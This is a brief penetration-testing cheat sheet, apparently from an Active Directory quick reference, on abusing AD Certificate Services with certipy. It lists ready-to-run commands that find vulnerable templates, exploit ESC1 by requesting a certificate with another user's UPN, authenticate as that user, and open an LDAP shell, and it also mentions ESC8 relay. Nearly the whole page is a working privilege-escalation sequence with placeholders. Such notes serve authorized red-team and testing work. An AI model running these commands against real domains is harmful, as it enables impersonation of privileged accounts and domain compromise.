# AD CS: template checks

[← Active Directory quick reference](../05-active-directory.md)

AD CS present: enumerate with the controlled account; verify template enrollment rights/settings.

```bash
certipy find -u <user>@<domain.tld> -p '<password>' -dc-ip <dc-ip> -vulnerable -stdout
```

ESC1: enrollee-supplied SAN + enrollment right:

```bash
certipy req -u <user>@<domain.tld> -p '<password>' -dc-ip <dc-ip> -ca <CA-NAME> -template <TEMPLATE> \
  -upn <target-user>@<domain.tld>
certipy auth -pfx <issued-certificate>.pfx -dc-ip <dc-ip>
```

Check local `certipy --help`. ESC8 needs HTTP enrollment + working NTLM relay path.

Certificate + `KDC_ERR_PADATA_TYPE_NOSUPP`: try Schannel/LDAP if available:

```bash
certipy auth -pfx <issued-certificate>.pfx -dc-ip <dc-ip> -ldap-shell
```
